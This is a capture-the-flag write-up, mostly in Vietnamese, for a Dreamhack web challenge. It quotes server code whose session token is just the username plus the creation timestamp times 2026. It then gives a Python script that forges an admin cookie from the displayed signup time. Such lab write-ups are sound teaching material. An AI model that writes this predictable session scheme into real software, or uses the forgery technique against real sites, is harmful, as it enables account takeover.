# What time is it?

## Challenge Information
- **Category**: Web Exploitation
- **Points**: hide
- **Difficulty**: level 1
- **Event**: hide
- **Author**: [liasdfio](https://dreamhack.io/users/82496)
- **Tags**: #web #session #hardcodesession
---
## 1. Description
> Log in as admin to earn FLAG 🕑
## 2. Overview
Bài này ta phải tìm cách tạo ra session của từng tài khoản khi register để bypass login vào admin account và lấy được flag
## 3. Reconnaissance
Trang web chỉ có giao diện đơn giản gồm 2 chức năng login và register:

![](images/Pasted%20image%2020260216134845.png)

![](images/Pasted%20image%2020260216134853.png)

![](images/Pasted%20image%2020260216134859.png)

Thử đăng ký 1 tài khoản và đăng nhập:

![](images/Pasted%20image%2020260216134915.png)

![](images/Pasted%20image%2020260216134943.png)

-> Đăng nhập thành công nhưng ngoài các thông tin của account `test` thì còn có cả ngày giờ đăng ký của `admin`
-> Với mô tả là login vào admin để lấy flag thì ta sẽ kiểm tra Cookie xem có thể làm được gì không

![](images/Pasted%20image%2020260216135035.png)

Session có một đoạn mã hóa gồm `username.{mã nào đó}`. Ta sẽ kiểm tra source code phía server để xem đoạn mã này là gì

```python
created_at = int(time.time())
    add_user(username, pw, created_at)
    resp = make_response(redirect(url_for("welcome")))
    resp.set_cookie("session", sess.make_session(username, created_at))
```
Cứ mỗi lần tạo một account mới thì một session sẽ được tạo ra bằng hàm `make_session()`, kiểm tra hàm này:
```python
def make_session(username: str, created_at: int) -> str:
    return f"{username}.{created_at * 2026}"
```
-> Hàm `make_session()` nhận vào 2 tham số là username và thời điểm tạo ra account bên trên.
```python
def verify_session(value: str, created_at: int) -> str | None:
    parsed = parse_session(value)
    if not parsed:
        return None
    username, token = parsed
    return username if token == str(created_at * 2026) else None
```
-> Và hàm verify cho ta thấy chỉ cần với thông tin thời gian tạo account admin ta có thể tái tạo lại được session và sửa đổi cookie để login được và `admin`
## 4. Exploitation
Để thuận tiện cho việc tính toán sinh ra session, ta sẽ viết code bằng Python để tự động hóa việc tính toán:
```python
from datetime import datetime, timezone  

# thời điểm tạo admin
time_str = "16/02/2026, 06:48:12"  

# chỉnh về đúng format
dt = datetime.strptime(time_str, "%d/%m/%Y, %H:%M:%S").replace(tzinfo=timezone.utc)

admin_created_at = int(dt.timestamp())  
  
admin_session = f"admin.{admin_created_at * 2026}"  
  
print(f"Session: {admin_session}")
```

Output:
```C++
Session: admin.3588500820792
```

sửa đổi cookie ta sẽ login vào được `admin` và lấy flag:

![](images/Pasted%20image%2020260216140443.png)